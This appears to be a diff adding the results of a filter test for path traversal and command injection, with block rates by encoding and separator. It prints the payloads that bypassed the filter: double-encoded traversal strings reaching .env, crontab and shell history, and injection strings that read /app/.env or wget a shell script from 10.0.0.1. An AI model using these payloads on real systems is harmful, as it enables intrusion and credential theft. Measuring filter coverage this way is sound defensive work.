@@ -1,0 +1,309 @@
+{
+  "inputs": {
+    "corpus": {
+      "path": "attack-sim/large_corpus_requests.json",
+      "sha256": "32a171803259cfc4cde87cfb3cf4e740a4eef26d13b562d885ea8abdf7348b1a"
+    },
+    "results": {
+      "path": "attack-sim/results_config2-develop-tarball-20261009.json",
+      "sha256": "dd4ea3c565f9368fabf146c56d1c48de08212e2c0c2e5f677a550532baa36bc9"
+    }
+  },
+  "path_traversal": {
+    "n": 200,
+    "blocked": 190,
+    "pct_blocked": 95.0,
+    "wilson_95_pct": [
+      91.04,
+      97.26
+    ],
+    "errors": [],
+    "by_encoding": {
+      "null_byte": {
+        "n": 29,
+        "blocked": 29,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          88.3,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "double_encoding": {
+        "n": 23,
+        "blocked": 14,
+        "pct_blocked": 60.87,
+        "wilson_95_pct": [
+          40.79,
+          77.84
+        ],
+        "not_blocked": [
+          {
+            "id": "path_traversal_17",
+            "payload": "%252e%252e%252f%252e%252e%252fboot.ini",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_50",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/hostname",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_58",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_63",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/.env",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_67",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_74",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fhome/node/.bash_history",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_85",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/resolv.conf",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_95",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/crontab",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_167",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fproc/self/status",
+            "status": 404
+          }
+        ]
+      },
+      "overlong_utf8": {
+        "n": 19,
+        "blocked": 18,
+        "pct_blocked": 94.74,
+        "wilson_95_pct": [
+          75.36,
+          99.06
+        ],
+        "not_blocked": [
+          {
+            "id": "path_traversal_113",
+            "payload": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afinetpub/wwwroot/web.config",
+            "status": 404
+          }
+        ]
+      },
+      "dot_slash_duplication": {
+        "n": 21,
+        "blocked": 21,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          84.54,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "backslash": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "absolute": {
+        "n": 15,
+        "blocked": 15,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          79.61,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "encoded_dotdot_slash_or_mixed": {
+        "n": 43,
+        "blocked": 43,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          91.8,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "raw_dotdot_slash": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ],
+        "not_blocked": []
+      }
+    },
+    "unclassified": []
+  },
+  "cmdi": {
+    "n": 200,
+    "blocked": 192,
+    "pct_blocked": 96.0,
+    "wilson_95_pct": [
+      92.31,
+      97.96
+    ],
+    "errors": [],
+    "by_system": {
+      "windows": {
+        "n": 34,
+        "blocked": 31,
+        "pct_blocked": 91.18,
+        "wilson_95_pct": [
+          77.04,
+          96.95
+        ]
+      },
+      "posix": {
+        "n": 166,
+        "blocked": 161,
+        "pct_blocked": 96.99,
+        "wilson_95_pct": [
+          93.14,
+          98.71
+        ]
+      }
+    },
+    "by_separator": {
+      "||": {
+        "n": 12,
+        "blocked": 12,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          75.75,
+          100.0
+        ]
+      },
+      "&&": {
+        "n": 32,
+        "blocked": 31,
+        "pct_blocked": 96.88,
+        "wilson_95_pct": [
+          84.26,
+          99.45
+        ]
+      },
+      "|": {
+        "n": 45,
+        "blocked": 43,
+        "pct_blocked": 95.56,
+        "wilson_95_pct": [
+          85.17,
+          98.77
+        ]
+      },
+      "&": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ]
+      },
+      ";": {
+        "n": 47,
+        "blocked": 43,
+        "pct_blocked": 91.49,
+        "wilson_95_pct": [
+          80.07,
+          96.64
+        ]
+      },
+      "newline (\\n / %0a)": {
+        "n": 31,
+        "blocked": 30,
+        "pct_blocked": 96.77,
+        "wilson_95_pct": [
+          83.81,
+          99.43
+        ]
+      },
+      "backticks": {
+        "n": 2,
+        "blocked": 2,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          34.24,
+          100.0
+        ]
+      },
+      "$()": {
+        "n": 6,
+        "blocked": 6,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          60.97,
+          100.0
+        ]
+      },
+      "no_separator": {
+        "n": 0,
+        "blocked": 0,
+        "pct_blocked": null,
+        "wilson_95_pct": null
+      }
+    },
+    "not_blocked": [
+      {
+        "id": "cmdi_6",
+        "payload": "127.0.0.1\nnet user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_31",
+        "payload": "127.0.0.1|net user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_36",
+        "payload": "127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_100",
+        "payload": "127.0.0.1;sleep 10 %23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_134",
+        "payload": "127.0.0.1&&cat /app/.env",
+        "status": 200
+      },
+      {
+        "id": "cmdi_152",
+        "payload": "127.0.0.1%3bcat /app/.env",
+        "status": 200
+      },
+      {
+        "id": "cmdi_184",
+        "payload": "127.0.0.1;net user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_192",
+        "payload": "127.0.0.1|sleep 10 %23",
+        "status": 200
+      }
+    ]
+  }
+}
